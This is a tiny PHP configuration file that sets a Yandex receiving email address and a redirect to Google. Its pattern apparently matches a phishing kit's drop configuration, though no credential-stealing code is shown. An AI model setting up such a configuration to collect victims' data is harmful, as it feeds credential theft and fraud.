<?php 
$Receive_email="austinnordltd@yandex.com";
$redirect="https://www.google.com/";
?>